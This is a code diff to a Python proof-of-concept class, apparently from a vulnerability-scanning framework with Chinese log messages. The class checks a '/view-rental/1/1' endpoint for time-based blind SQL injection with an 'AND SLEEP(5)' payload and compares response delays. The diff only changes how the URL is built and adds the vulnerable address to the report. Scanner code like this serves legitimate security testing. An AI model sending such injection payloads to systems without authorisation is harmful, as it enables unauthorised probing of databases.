@@ -48,11 +48,10 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
             payload1 = "/view-rental/1/1"
             payload2 = "/view-rental/1/1 AND SLEEP(5)"
-            vul_url1 = arg + payload1
-            vul_url2 = arg + payload2
+            vul_url1 = self.target + payload1
+            vul_url2 = self.target + payload2
 
             headers = {
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -73,8 +72,8 @@ class Poc(ABPoc):
             delta2 = end_time_2 - end_time_1
 
             if (delta2 - delta1) > 4:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name, url=vul_url2))
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
 
